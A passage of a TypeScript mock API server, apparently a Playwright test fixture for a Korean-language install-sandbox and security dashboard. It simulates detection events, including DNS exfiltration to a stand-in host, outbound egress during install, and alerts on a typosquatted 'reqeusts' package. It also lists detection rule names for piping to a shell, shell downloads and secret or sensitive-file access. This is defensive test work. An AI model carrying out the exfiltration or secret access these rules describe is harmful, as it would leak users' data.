        () => kill(e({ kind: 'connect', comm: 'python3', dstIp: '93.184.216.34', dstPort: 443, dstHost: 'example.com' }), 'sandbox-egress', '설치 중 외부 통신'),
      ],
      'dns-exfil': [
        () => alert(e({ kind: 'dns', comm: 'python3', dstHost: DNS_EXFIL_NAME, qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
        () => alert(e({ kind: 'dns', comm: 'python3', dstHost: 'data.exfil.example', qtype: 'TXT', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', '금지 질의 유형: TXT — data.exfil.example'),
      ],
      all: [],
    };
    V.all = [...V.shell, ...V.revshell, ...V['direct-ip'], ...V.domain, ...V['dns-exfil']];
    const steps: (() => void)[] = [];
    // ② 정상 이벤트 1건(설치 시작)
    steps.push(() => {
      const v = ok(e({ kind: 'exec', comm: 'pip', args: 'pip install --no-cache-dir --progress-bar off /pkg/reqeusts' }));
      session.activity!.kinds.exec = (session.activity!.kinds.exec ?? 0) + 1;
      session.activity!.programs.push({ comm: 'pip', args: v.event.args!, count: 1, level: 'normal' });
      this.recent.unshift(v);
      this.send({ type: 'verdict', data: v });
    });
    let stopped = false;
    const finish = (status: InstallSession['status'], exitCode: number) => {
      session.status = status;
      session.exitCode = exitCode;
      session.finishedAt = at();
      run.status = 'finished';
      run.exitCode = exitCode;
      run.finishedAt = session.finishedAt;
      this.demo.last = run;
      this.demo.running = null;
      if (status !== 'passed') {
        const n = ++this.seq;
        const level = status === 'isolated' ? 'killed' : 'alert';
        const c: Case = {
          id: `case-${String(n).padStart(4, '0')}`, source: 'install', installId: session.id, container: ctr, label: 'pip ./reqeusts', image: PYIMG, package: 'pip:reqeusts',
          openedAt: at(), level, violations: session.violations!.reduce((k, v) => k + v.count, 0), ruleIds: [...new Set(session.violations!.map((v) => v.ruleId!))],
          state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null, isolation: session.isolation ?? null,
        };
        session.caseId = c.id;
        this.cases.unshift(c);
        for (const a of this.audit) if (a.event.containerName === ctr) a.caseId = c.id;
        this.send({ type: 'case', data: { ...c } });
      }
    };
    for (const mk of V[run.scenario]) {
      steps.push(() => {
        if (stopped) return;
        const v = mk();
        if (v.enforced) v.timeline = timeline(Date.parse(v.event.timestamp));
        const k = v.event.kind;
        session.activity!.kinds[k] = (session.activity!.kinds[k] ?? 0) + 1;
        const iv: InstallViolation = { ...v, count: 1 };
        session.violations!.push(iv);
        const top = Math.max(0, ...this.audit.map((a) => a.id)) + 1;
        this.audit.unshift({ ...v, id: top, caseId: null, install: { id: session.id, label: 'pip ./reqeusts' } });
        this.recent.unshift(v);
        this.send({ type: 'verdict', data: v });
        if (v.enforced) {
          stopped = true;
          session.isolation = { auditId: top, timeline: v.timeline! };
          finish('isolated', 137);
        }
      });
    }
    steps.push(() => {
      if (!stopped) finish(session.violations!.length ? 'warned' : 'passed', 0);
    });
    steps.forEach((fn, i) => this.demoTimers.push(setTimeout(fn, this.demoStepMs * (i + 1)) as unknown as number));
  }
  // W16: 앱은 로그인 확인(/api/auth/me) 뒤에 실시간 연결을 연다 — 그 전에 보낸 메시지는 연결되면 보낸다
  private pending: string[] = [];
  send(msg: WsMessage) {
    if (this.ws) this.ws.send(JSON.stringify(msg));
    else this.pending.push(JSON.stringify(msg));
  }
  writes() {
    return this.requests.filter((r) => r.method !== 'GET');
  }

  // 10/20 도우미: 새 건이 열린 것처럼 — 설치 세션(설치 건이면) · 건을 만들고 WS {type:"case"} 로 알린다
  openCase(o: { source?: 'install' | 'runtime'; level?: Level; ruleIds?: string[]; label?: string } = {}): Case {
    const n = ++this.seq;
    const id = `case-${String(n).padStart(4, '0')}`;
    const source = o.source ?? 'install';
    const level = o.level ?? (this.info.enforceKill ? 'killed' : 'held');
    const ruleIds = o.ruleIds ?? ['pipe-to-shell', 'no-shell-download', 'sandbox-secrets', 'sensitive-files', 'sandbox-egress'];
    const now = Date.now();
    const at = new Date(now).toISOString();
    const installId = source === 'install' ? `ins-${String(n).padStart(4, '0')}` : null;
    const container = source === 'install' ? `sg-install-pip-${Math.floor(now / 1000)}-${n}` : (o.label ?? 'pkg-runtime');
    if (installId) {
      const violations: InstallViolation[] = ruleIds.map((r, i) => ({
        ...(level === 'alert' ? alert : kill)(ev(now, 2 - i * 0.1, container, PYIMG, { kind: 'exec', comm: 'sh', args: `sh -c demo ${r}` }), r, r),
        enforced: level === 'killed',
        count: 1,
      }));
      this.installs.unshift({
        id: installId, manager: 'pip', packages: ['./reqeusts'], container, containerId: `${installId}abcdef0123456789`, image: PYIMG,
        startedAt: ago(now, 5), finishedAt: at, exitCode: level === 'killed' ? 137 : 0, status: level === 'alert' ? 'warned' : 'isolated',
        caseId: id, refusedBy: null, violations, activity: { kinds: { exec: ruleIds.length }, hosts: [], programs: [] },
      });
    }
    const c: Case = {
      id, source, installId, container, label: o.label ?? (source === 'install' ? 'pip ./reqeusts' : container), image: source === 'install' ? PYIMG : 'demo/runtime:1.0',
      package: source === 'install' ? 'pip:reqeusts' : null, openedAt: at, level, violations: ruleIds.length, ruleIds, state: 'open', decision: 'pending',
      decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null,
    };
    this.cases.unshift(c);
    this.send({ type: 'case', data: { ...c } });
    return c;
  }

  async attach(page: Page) {
    await page.routeWebSocket(/\/ws\/events$/, (ws) => {
      // 실제 백엔드는 로그인 안 된 /ws/events 업그레이드를 401 로 거절한다 — 여기서는 바로 닫는다
      if (!this.auth.active()) {
        void ws.close({ code: 1008, reason: 'unauthorized' });
        return;
      }
      if (this.wsRefuse) {
        void ws.close({ code: 1006, reason: 'down' });
        return;
      }
      this.ws = ws;
      // StrictMode 는 첫 연결을 바로 닫고 다시 연다 — 남은 연결(마지막 ws)에만 밀린 메시지를 보낸다
      setTimeout(() => {
        if (this.ws === ws) for (const m of this.pending.splice(0)) void ws.send(m);
      }, 200); // connectToServer 를 부르지 않으므로 서버 없이 열린 상태가 된다
      ws.onMessage(() => {});
    });
    await page.route(/\/api\//, (route) => this.handle(route));
  }

  private async handle(route: Route) {
    const req = route.request();
    const url = new URL(req.url());
    const path = url.pathname.replace(/^\/api/, '');
    const method = req.method();
    const body = req.postData() ?? undefined;
    this.requests.push({ method, path: path + url.search, auth: req.headers()['authorization'] ?? null, body });

    if ([...this.unsupported].some((p) => path.startsWith(p))) {
      return route.fulfill({ status: 404, contentType: 'text/plain; charset=utf-8', body: '404 page not found' });
    }
    const json = (data: unknown, status = 200) => route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(data) });
    const fail = (status: number, error: string) => json({ error }, status);
    if (this.failing.has(path)) return fail(this.failing.get(path)!, '모의 오류 — 서버가 응답하지 않습니다');
    const q = url.searchParams;
    // 읽기 전용 POST(미리보기 · AI 도우미 질문)는 조회자도 부른다 — 백엔드 ViewerWritePatterns
    const writing = method !== 'GET' && !path.endsWith('/preview') && path !== '/chat';
    // 인증 미들웨어(backend auth.Middleware) → 단계 · 계정 · 라이선스 경로
    const gate = this.auth.gate(method, path, writing);
    if (gate) return json(gate.body, gate.status);
    const a = this.auth.handle(method, path, body, q);
    if (a) return a.status === 204 ? route.fulfill({ status: 204 }) : json(a.body, a.status);
    if (method === 'POST' && path === '/notify/test') {
      const n = this.info.notify;
      if (!n?.channels.length) return fail(409, '설정된 알림 채널이 없습니다');
      this.notifyTests++;
      // 발송은 비동기 — 다음 /api/info 에서 보낸 수가 오른다
      n.channels = n.channels.map((c) => ({ ...c, sent: c.sent + 1, lastAt: new Date().toISOString() }));
      n.sent += n.channels.length;
      return json({ queued: n.channels.length }, 202);
    }
    let m: RegExpMatchArray | null;

    // 10/30 시연 실행 API(계약 §2) — DEMO_ENABLED 가 아니면 경로 자체가 없다(404 텍스트)
    if (path === '/demo' || path === '/demo/run') {
      if (!this.info.demo) return route.fulfill({ status: 404, contentType: 'text/plain', body: '404 page not found' });
      if (method === 'GET' && path === '/demo') return json({ enabled: true, scenarios: DEMO_SCENARIOS, running: this.demo.running, last: this.demo.last } satisfies DemoState);
      if (method === 'POST' && path === '/demo/run') {
        const { scenario } = JSON.parse(body || '{}') as { scenario?: DemoScenario };
        if (!scenario || !DEMO_SCENARIOS.includes(scenario)) return fail(400, 'scenario: all | shell | revshell | direct-ip | domain | dns-exfil');
        if (this.demo.running) return json({ error: '시연이 이미 실행 중입니다', running: this.demo.running }, 409);
        if (this.demoDown) return fail(503, 'Docker 에 연결할 수 없습니다');
        const n = ++this.seq;
        const run = demoRun(scenario, `ins-${String(n).padStart(4, '0')}`, Math.floor(Date.now() / 1000) + n);
        this.addChange('demo_run', `시연 실행: ${scenario}`);
        if (this.demoRefused) {
          // 차단 목록에 pip:reqeusts 가 있으면 sg-install 처럼 설치 전 거부 세션
          run.status = 'refused';
          run.finishedAt = run.startedAt;
          this.installs.unshift({ id: run.installId, manager: 'pip', packages: ['./reqeusts'], container: '', image: PYIMG, startedAt: run.startedAt, finishedAt: run.startedAt, status: 'refused', refusedBy: { list: 'packages', value: 'pip:reqeusts' }, caseId: null });
          this.demo.last = run;
          return json(run, 202);
        }
        this.demo.running = run;
        this.startDemo(run);
        return json(run, 202);
      }
    }

    // 기존 API
    if (method === 'GET' && path === '/info') return json(this.info);
    if (method === 'GET' && path === '/stats') return json(this.stats);
    if (method === 'GET' && path === '/events/recent') return json(this.recent.slice(0, Number(q.get('limit') ?? 500)));
    if (method === 'GET' && path === '/policies') return json(this.rules);
    if (method === 'GET' && path === '/policies/export') return route.fulfill({ status: 200, contentType: 'application/yaml', body: this.rules.map((r) => `- id: ${r.id}\n  kind: ${r.kind}\n  action: ${r.action}\n`).join('') });
    // eBPF 수집 종합(10/16) — 백엔드 internal/summary 와 같은 규칙
    if (method === 'GET' && path === '/summary') return json(this.summary(q.get('range') || '24h'), this.summaryRanges[q.get('range') || '24h'] ? 200 : 400);
    // 정책 저장 전 확인(10/16): 그 정책이 걸었던 감사 행의 탐지 결과가 새 대응으로 어떻게 바뀌나(간이 재평가)
    if (method === 'POST' && path === '/policies/preview') {
      const r = JSON.parse(body ?? '{}') as Rule;
      if (r.id === 'blocklist-hosts') return fail(409, '차단 목록에서 관리하는 시스템 규칙입니다');
      const after: Level = r.disabled ? 'normal' : r.action !== 'kill' ? 'alert' : r.dryRun ? 'held' : 'killed';
      const changed = this.audit
        .filter((a) => a.ruleId === r.id && levelOf(a) !== after)
        .map((a) => ({ auditId: a.id, before: levelOf(a), after, container: a.event.containerName, ruleId: r.id }));
      const blocking = (l: string) => l === 'killed' || l === 'held';
      const pv: Preview = { evaluated: this.audit.length, changed, nextOnly: [], counts: { toNormal: changed.filter((c) => c.after === 'normal').length, toBlocked: changed.filter((c) => blocking(c.after) && !blocking(c.before)).length } };
      return json(pv);
    }
    if (method === 'POST' && path === '/policies') {
      const r = JSON.parse(body ?? '{}') as Rule;
      const i = this.rules.findIndex((x) => x.id === r.id);
      if (i >= 0) this.rules[i] = r;
      else this.rules.push(r);
      this.addChange('policy_edit', `정책 ${r.id} 저장`);
      return json(r);
    }
    if (method === 'PUT' && path === '/policies') {
      this.addChange('policy_replace', `정책 ${this.rules.length}개 YAML 교체`);
      return json(this.rules);
    }
    if (method === 'DELETE' && (m = path.match(/^\/policies\/(.+)$/))) {
      this.rules = this.rules.filter((r) => r.id !== decodeURIComponent(m![1]));
      this.addChange('policy_edit', `정책 ${decodeURIComponent(m[1])} 삭제`);
      return route.fulfill({ status: 204 });
    }
    if (method === 'GET' && path === '/audit') {
      const since = q.get('since') ? new Date(q.get('since')!).getTime() : -Infinity;
      const until = q.get('until') ? new Date(q.get('until')!).getTime() : Infinity;
      const before = Number(q.get('before') ?? Infinity);
      const rows = this.audit.filter((a) => {
        const t = new Date(a.event.timestamp).getTime();
        return (
          (!q.get('kind') || a.event.kind === q.get('kind')) &&
          (!q.get('action') || a.action === q.get('action')) &&
          (!q.get('rule') || (a.ruleId ?? '').includes(q.get('rule')!)) &&
          (!q.get('container') || a.event.containerName.includes(q.get('container')!)) &&
          t >= since &&
          t <= until &&
          a.id < before
        );
      });
      return json(rows.slice(0, Number(q.get('limit') ?? 100)));
    }

    // 설치 검사
    if (method === 'GET' && path === '/installs') {
      const rows = this.installs
        .filter((s) => (!q.get('status') || s.status === q.get('status')) && (!q.get('manager') || s.manager === q.get('manager')))
        .map((s) => {
          const violationCount = (s.violations ?? []).reduce((n, v) => n + v.count, 0);
          if (!this.listOmitsDetail) return { ...s, violationCount };
          const { violations: _v, activity: _a, ...rest } = s;
          void _v;
          void _a;
          return { ...rest, violationCount };
        });
      return json(rows.slice(0, Math.min(500, Number(q.get('limit') ?? 50))));
    }
    if (method === 'GET' && (m = path.match(/^\/installs\/([^/]+)$/))) {
      const s = this.installs.find((x) => x.id === decodeURIComponent(m![1]));
      return s ? json(s) : fail(404, '세션 없음');
    }

    // 건 · 판정
    if (method === 'GET' && path === '/cases') {
      return json(this.cases.filter((c) => (!q.get('state') || c.state === q.get('state')) && (!q.get('source') || c.source === q.get('source'))));
    }
    if (method === 'GET' && (m = path.match(/^\/cases\/([^/]+)$/))) {
      const c = this.cases.find((x) => x.id === m![1]);
      return c ? json(c) : fail(404, '건 없음');
    }
    if (method === 'POST' && (m = path.match(/^\/cases\/([^/]+)\/decide$/))) {
      const c = this.cases.find((x) => x.id === m![1]);
      if (!c) return fail(404, '건 없음');
      if (c.decision !== 'pending') return fail(409, '이미 판정된 건');
      const { decision, note } = JSON.parse(body ?? '{}') as { decision: 'malicious' | 'false_positive'; note?: string };
      const { changes, notes } = this.proposalChanges(c, decision);
      const p: Proposal = { id: `prop-${String(++this.seq).padStart(4, '0')}`, caseId: c.id, decision, state: 'draft', createdAt: new Date().toISOString(), createdBy: this.auth.actorName(), appliedAt: null, appliedBy: null, changes, notes };
      this.proposals.unshift(p);
      Object.assign(c, { decision, note: note ?? '', state: 'decided', decidedAt: new Date().toISOString(), decidedBy: this.auth.actorName(), proposalId: p.id });
      this.send({ type: 'case', data: { ...c } });
      return json({ case: c, proposal: p });
    }
    // W18: 판정 미리보기(백엔드 review/decision_preview.go 계약, 간이) — 저장 없음
    if (method === 'POST' && (m = path.match(/^\/cases\/([^/]+)\/preview$/))) {
      const c = this.cases.find((x) => x.id === m![1]);
      if (!c) return fail(404, '건 없음');
      if (c.decision !== 'pending') return fail(409, '이미 판정된 건');
      const { decision } = JSON.parse(body ?? '{}') as { decision: 'malicious' | 'false_positive' };
      if (decision !== 'malicious' && decision !== 'false_positive') return fail(400, 'decision: malicious | false_positive');
      return json(this.decisionPreview(c, decision));
    }
    // W18: 새 기본 규칙 · 증거
    if (method === 'GET' && path === '/policies/defaults') return json(this.policyDefaults);
    if (method === 'GET' && path === '/evidence') {
      const k = q.get('container') ?? '';
      if (!k) return fail(400, 'container 가 필요합니다');
      return json(this.evidence.filter((e) => e.containerName === k || e.containerId.startsWith(k)).sort((a, b) => b.collectedAt.localeCompare(a.collectedAt)));
    }

    // 제안
    if (method === 'GET' && path === '/proposals') return json(this.proposals.filter((p) => !q.get('state') || p.state === q.get('state')));
    if (method === 'POST' && (m = path.match(/^\/proposals\/([^/]+)\/(preview|apply|discard)$/))) {
      const p = this.proposals.find((x) => x.id === m![1]);
      if (!p) return fail(404, '제안 없음');
      if (m[2] === 'preview') return json(this.preview(p));
      if (p.state !== 'draft') return fail(409, '초안이 아닌 제안');
      const c = this.case(p.caseId);
      const at = new Date().toISOString();
      const reason = ((JSON.parse(body || '{}') as { reason?: string }).reason ?? '').trim(); // W15 · W18: 사유 → 변경 이력
      if (m[2] === 'apply') {
        for (const ch of p.changes) {
          if (ch.op === 'block') this.blocklist[ch.list].unshift({ value: ch.value, caseId: c.id, at, by: this.auth.actorName() });
          else {
            const r = this.rules.find((x) => x.id === ch.ruleId)!;
            const key = ch.field as keyof Rule;
            (r[key] as unknown as string[]) = [...((r[key] as unknown as string[]) ?? []), ch.value];
          }
        }
        Object.assign(p, { state: 'applied', appliedAt: at, appliedBy: this.auth.actorName() });
        this.addChange('proposal_applied', this.changeSummary(p), c.id, p.id, reason);
      } else {
        Object.assign(p, { state: 'discarded' });
        this.addChange('proposal_discarded', `제안 ${p.id} 버림 — 변경 없이 건 종결`, c.id, p.id, reason);
      }
      Object.assign(c, { state: 'closed', closedAt: at });
      this.send({ type: 'case', data: { ...c } });
      return json(p);
    }

    // 차단 목록 · 변경 이력 · OSV
    if (method === 'GET' && path === '/blocklist') return json(this.blocklist);
    if (method === 'DELETE' && (m = path.match(/^\/blocklist\/(packages|images|hosts)\/(.+)$/))) {
      const list = m[1] as BlockList;
      const value = decodeURIComponent(m[2]);
      this.blocklist[list] = this.blocklist[list].filter((e) => e.value !== value);
      this.addChange('blocklist_remove', `${value} 차단 해제`, null, null, ((JSON.parse(body || '{}') as { reason?: string }).reason ?? '').trim());
      return route.fulfill({ status: 204 });
    }
    if (method === 'GET' && path === '/changes') return json(this.changes.slice(0, Number(q.get('limit') ?? 100)));
    if (method === 'GET' && path === '/osv') {
      const eco = q.get('ecosystem') ?? '';
      const name = q.get('name') ?? '';
      const r: OsvResult = this.osvFail
        ? { ecosystem: eco, name, vulns: 0, ids: [], queriedAt: new Date().toISOString(), source: 'osv.dev', error: 'osv.dev 시간 초과(5초)' }
        : { ecosystem: eco, name, vulns: this.osv[`${eco}:${name}`] ?? 0, ids: Array.from({ length: Math.min(3, this.osv[`${eco}:${name}`] ?? 0) }, (_, i) => `PYSEC-2023-${74 + i}`), queriedAt: new Date().toISOString(), source: 'osv.dev', error: null };
      return json(r);
    }
    if (method === 'POST' && path === '/chat') {
      if (!this.info.chat) return route.fulfill({ status: 404, contentType: 'text/plain', body: '404 page not found' });
      const r = this.chatReply ?? {};
      if (r.status && r.status !== 200) return fail(r.status, r.error ?? '오류');
      return route.fulfill({ status: 200, contentType: 'text/event-stream; charset=utf-8', body: sseBody(r.events ?? this.chatPending()) });
    }
    return route.fulfill({ status: 404, contentType: 'text/plain', body: '404 page not found' });
  }

  // 기본 답: 판정 대기 요약 — token 조각 → facts → links → done
  chatPending(): [string, unknown][] {
    const open = this.cases.filter((c) => c.state === 'open');
    return [
      ['token', `판정 대기 건이 `],
      ['token', `${open.length}개 있습니다. `],
      ['token', '각 건을 열어 판정하세요.'],
      ['facts', { intent: 'pending', tool: 'pending_cases', status: `판정 대기 ${open.length}건`, sentences: open.map((c) => `${c.label} 은 판정 대기입니다.`), cases: [] }],
      ['links', [{ label: '감사 로그 — 판정 · 변경 이력', href: '/audit?view=changes' }]],
      ['done', {}],
    ];
  }

  // 10/16: 공급망 검사 「차단 목록에 올리기」로 연 건(source scan). decided 면 악성 판정 + 초안 제안까지
  scanCase(o: { decided?: boolean } = {}): { c: Case; p: Proposal | null } {
    const n = ++this.seq;
    const id = `case-${String(n).padStart(4, '0')}`;
    const at = new Date().toISOString();
    const c: Case = {
      id, source: 'scan', installId: null, scanId: 'scan-0007', container: '', label: 'pip evil-pkg 0.1.0', image: '', package: 'pip:evil-pkg',
      openedAt: at, level: 'held', violations: 1, ruleIds: ['supply-chain-scan'], state: 'open', decision: 'pending',
      decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null,
    };
    let p: Proposal | null = null;
    if (o.decided) {
      p = { id: `prop-${String(++this.seq).padStart(4, '0')}`, caseId: id, decision: 'malicious', state: 'draft', createdAt: at, createdBy: ACTOR, appliedAt: null, appliedBy: null, changes: [{ op: 'block', list: 'packages', value: 'pip:evil-pkg' }], notes: [] };
      this.proposals.unshift(p);
      Object.assign(c, { decision: 'malicious', state: 'decided', decidedAt: at, decidedBy: ACTOR, note: '공급망 검사 scan-0007', proposalId: p.id });
    }
    this.cases.unshift(c);
    return { c, p };
  }

  summaryRanges: Record<string, [number, number]> = { '1h': [60, 60], '24h': [24, 3600], '7d': [28, 21600] };
  summary(range: string): Summary {
    const [n, step] = this.summaryRanges[range] ?? [24, 3600];
    const stepMs = step * 1000;
    const end = Math.floor(Date.now() / stepMs) * stepMs + stepMs;
    const from = end - n * stepMs;
    // 10/30: dns 는 enableDns() 일 때만(옛 백엔드처럼 키 자체가 없는 응답도 화면이 받아야 한다)
    const series: Summary['series'] = Array.from({ length: n }, (_, i) => ({ t: new Date(from + i * stepMs).toISOString(), exec: 0, open: 0, connect: 0, ...(this.dnsCollected ? { dns: 0 } : {}), killed: 0, alert: 0 }));
    const at = (ms: number) => (ms >= from && ms < end ? series[Math.floor((ms - from) / stepMs)] : undefined);
    const byKind: Summary['collected']['byKind'] = { exec: 0, open: 0, connect: 0, ...(this.dnsCollected ? { dns: 0 } : {}) };
    const kinds = this.dnsCollected ? (['exec', 'open', 'connect', 'dns'] as const) : (['exec', 'open', 'connect'] as const);
    for (const c of this.collected) {
      const b = at(c.minute * 60000);
      if (!b) continue;
      for (const k of kinds) {
        b[k] = (b[k] ?? 0) + (c[k] ?? 0);
        byKind[k] = (byKind[k] ?? 0) + (c[k] ?? 0);
      }
    }
    // 격리 지연(계약 §3): 범위 안 killedAt 있는 행, ms = killedAt − detectedAt
    const lat = this.audit
      .filter((a) => a.timeline?.killedAt && Date.parse(a.event.timestamp) >= from && Date.parse(a.event.timestamp) < end)
      .map((a) => Date.parse(a.timeline!.killedAt!) - Date.parse(a.timeline!.detectedAt))
      .sort((x, y) => x - y);
    const q = (p: number) => (lat.length ? lat[Math.min(lat.length - 1, Math.floor(p * lat.length))] : null);
    const isolation = { count: lat.length, medianMs: lat.length ? lat[Math.floor((lat.length - 1) / 2)] : null, p95Ms: q(0.95), maxMs: lat.length ? lat[lat.length - 1] : null };
    const vio = { total: 0, killed: 0, alert: 0, held: 0 };
    const isolated = new Set<string>();
    const tops = { rules: new Map<string, { count: number; level: Level }>(), ctrs: new Map<string, { count: number; level: Level }>() };
    const rank: Record<Level, number> = { normal: 0, alert: 1, held: 2, killed: 3 };
    const bump = (m: Map<string, { count: number; level: Level }>, k: string, l: Level) => {
      const x = m.get(k) ?? { count: 0, level: l };
      x.count++;
      if (rank[l] > rank[x.level]) x.level = l;
      m.set(k, x);
    };
    for (const a of this.audit) {
      const ms = Date.parse(a.event.timestamp);
      if (ms < from || ms >= end) continue;
      const l = levelOf(a);
      vio.total++;
      if (l === 'killed') {
        vio.killed++;
        isolated.add(a.event.containerName);
      } else if (l === 'held') vio.held++;
      else vio.alert++;
      const b = at(ms);
      if (b) b[l === 'killed' || l === 'held' ? 'killed' : 'alert']++;
      if (a.ruleId) bump(tops.rules, a.ruleId, l);
      bump(tops.ctrs, a.install?.label ?? a.event.containerName, l);
    }
    const sorted = (m: Map<string, { count: number; level: Level }>) => [...m.entries()].sort((x, y) => y[1].count - x[1].count || x[0].localeCompare(y[0])).slice(0, 10);
    const ins = this.installs.filter((s) => Date.parse(s.startedAt) >= from);
    const st = (k: string) => ins.filter((s) => s.status === k).length;
    const dec = this.cases.filter((c) => c.decidedAt && Date.parse(c.decidedAt) >= from);
    return {
      range: this.summaryRanges[range] ? range : '24h',
      from: new Date(from).toISOString(),
      to: new Date(end).toISOString(),
      bucketSec: step,
      collected: { total: byKind.exec + byKind.open + byKind.connect + (byKind.dns ?? 0), byKind },
      violations: vio,
      isolatedContainers: isolated.size,
      series,
      topRules: sorted(tops.rules).map(([ruleId, v]) => ({ ruleId, ...v })),
      topContainers: sorted(tops.ctrs).map(([container, v]) => ({ container, ...v })),
      installs: { total: ins.length, passed: st('passed'), isolated: st('isolated'), warned: st('warned'), refused: st('refused'), failed: st('failed') + st('unknown'), running: st('running') },
      decisions: { malicious: dec.filter((c) => c.decision === 'malicious').length, falsePositive: dec.filter((c) => c.decision === 'false_positive').length, pending: this.cases.filter((c) => c.state === 'open').length },
      blocklist: { packages: this.blocklist.packages.length, images: this.blocklist.images.length, hosts: this.blocklist.hosts.length },
      isolation,
    };
  }

  private addChange(kind: Change['kind'], summary: string, caseId: string | null = null, proposalId: string | null = null, reason = '') {
    this.changes.unshift({ id: `chg-${String(++this.seq).padStart(4, '0')}`, at: new Date().toISOString(), by: this.auth.actorName(), kind, caseId, proposalId, summary, reason });
  }

  // W18: 판정 미리보기 effects — 백엔드와 같은 kind(blocklist · already_blocked · package · image · host · exception · none · note · next)
  private decisionPreview(c: Case, decision: 'malicious' | 'false_positive'): DecisionPreview {
    const { changes, notes } = this.proposalChanges(c, decision);
    const label = { packages: '패키지', images: '이미지', hosts: '도메인' } as const;
    const effects: DecisionEffect[] = [];
    if (decision === 'malicious') {
      const blocks = changes.filter((x): x is Extract<ProposalChange, { op: 'block' }> => x.op === 'block');
      const fresh = blocks.filter((x) => !this.blocklist[x.list].some((e) => e.value === x.value));
      const already = blocks.filter((x) => !fresh.includes(x));
      if (fresh.length) {
        const by = (['packages', 'images', 'hosts'] as const).filter((l) => fresh.some((x) => x.list === l)).map((l) => `${label[l]} ${fresh.filter((x) => x.list === l).length}`);
        effects.push({ kind: 'blocklist', count: fresh.length, text: `차단 목록 +${fresh.length} (${by.join(' · ')})` });
      }
      if (already.length) effects.push({ kind: 'already_blocked', count: already.length, text: `이미 차단 목록에 있는 ${already.length}개(${already.map((x) => `${label[x.list]} ${x.value}`).join(', ')})는 그대로 둡니다` });
      if (!fresh.length) effects.push({ kind: 'none', text: '새로 차단할 대상이 없습니다 — 적용하면 건만 종결합니다' });
      for (const x of fresh) {
        if (x.list === 'packages') effects.push({ kind: 'package', text: `다음 sg-install 부터 ${x.value} 는 설치 전에 거부됩니다(컨테이너를 띄우지 않음)` });
        if (x.list === 'images') effects.push({ kind: 'image', count: 1, text: `같은 이미지(${x.value})를 쓰는 실행 중 컨테이너 1개 — 적용하면 다음 시작 때 격리됩니다(지금 실행은 그대로)` });
      }
      const hosts = fresh.filter((x) => x.list === 'hosts').map((x) => x.value);
      if (hosts.length) effects.push({ kind: 'host', count: hosts.length, text: `도메인 ${hosts.length}개(${hosts.join(', ')})는 적용 즉시 시스템 규칙 blocklist-hosts 로 차단됩니다(런타임 · 설치 모두)` });
    } else {
      const ex = changes.filter((x): x is Extract<ProposalChange, { op: 'except' }> => x.op === 'except');
      for (const x of ex) {
        const r = this.rules.find((y) => y.id === x.ruleId);
        effects.push({ kind: 'exception', text: `규칙 ${x.ruleId} 예외 추가 — ${x.field} 에 ${x.value} (범위: ${r?.containers?.length ? `컨테이너 ${r.containers.join(', ')}` : '모든 컨테이너'}). 적용 즉시 엔진에 반영됩니다` });
      }
      if (!ex.length) effects.push({ kind: 'none', text: '자동으로 만들 예외가 없습니다 — 정책 탭에서 직접 고칩니다' });
    }
    for (const n of notes) effects.push({ kind: 'note', text: n });
    effects.push({ kind: 'next', text: '판정하면 제안 초안이 생깁니다 — 아직 아무것도 바뀌지 않으며, 정책 화면에서 미리보기 후 적용합니다' });
    return { caseId: c.id, decision, changes, notes, effects };
  }

  private changeSummary(p: Proposal) {
    return p.changes
      .map((c) => (c.op === 'block' ? `${{ packages: '패키지', images: '이미지', hosts: '도메인' }[c.list]} ${c.value} 차단` : `${c.ruleId} 예외 ${c.value}`))
      .join(' · ');
  }

  // 계약 「판정 → 제안 만들기」 표 — 백엔드 review/cases.go 와 같은 규칙(2026-10-15 결정 반영)
  private proposalChanges(c: Case, decision: 'malicious' | 'false_positive'): { changes: ProposalChange[]; notes: string[] } {
    const vs = c.source === 'install' ? (this.installs.find((s) => s.id === c.installId)?.violations ?? []) : this.audit.filter((a) => a.caseId === c.id);
    const out: ProposalChange[] = [];
    const notes: string[] = [];
    const add = (x: ProposalChange) => {
      if (!out.some((o) => JSON.stringify(o) === JSON.stringify(x))) out.push(x);
    };
    const note = (n: string) => !notes.includes(n) && notes.push(n);
    const hostMatches = (pat: string, host: string) => host === pat || host.endsWith(`.${pat.replace(/^\*\./, '')}`);
    if (decision === 'malicious') {
      if (c.source === 'install' || c.source === 'scan') add({ op: 'block', list: 'packages', value: c.package! });
      else add({ op: 'block', list: 'images', value: c.image });
      for (const v of vs) {
        // 10/30: dns 질의도 질의 이름(dstHost)을 도메인 차단 후보로
        const host = v.event.kind === 'connect' || v.event.kind === 'dns' ? v.event.dstHost : undefined;
        if (v.event.kind !== 'connect' && v.event.kind !== 'dns') continue;
        if (!host) {
          note(`${v.event.dstIp} 은 도메인을 몰라 도메인 차단을 만들지 않았습니다`);
          continue;
        }
        // 어느 규칙의 allowHosts 에 있는 도메인은 막지 않는다
        const by = this.rules.find((r) => (r.allowHosts ?? []).some((h) => hostMatches(h, host)));
        if (by) note(`도메인 ${host} 은 규칙 ${by.id} 의 허용 도메인이라 차단하지 않았습니다`);
        else add({ op: 'block', list: 'hosts', value: host });
      }
    } else {
      const hadHosts = new Set(this.rules.filter((r) => r.allowHosts?.length).map((r) => r.id));
      for (const v of vs) {
        if (!v.ruleId) continue;
        const rule = this.rules.find((r) => r.id === v.ruleId);
        if (v.ruleId === 'blocked-image') note('이미지 차단은 예외가 아니라 차단 목록에서 해제합니다');
        else if (rule?.kind === 'exec') note(`실행 규칙 ${v.ruleId} 은 자동 예외를 만들지 않습니다 — 정책 탭에서 직접 수정하세요`);
        // 엔진은 금지 목록(denyPorts · denyHosts)을 허용 목록보다 먼저 본다 — 예외로 풀 수 없으면 안내만
        else if (v.event.kind === 'connect' && (rule?.denyPorts?.includes(v.event.dstPort ?? -1) || rule?.denyHosts?.some((h) => v.event.dstHost && hostMatches(h, v.event.dstHost))))
          note(`규칙 ${v.ruleId} 은 금지 목록에 걸려 예외로 풀 수 없습니다 — 정책 탭에서 직접 수정하세요`);
        else if (v.event.kind === 'open' && v.event.path) add({ op: 'except', ruleId: v.ruleId, field: 'allowPaths', value: v.event.path });
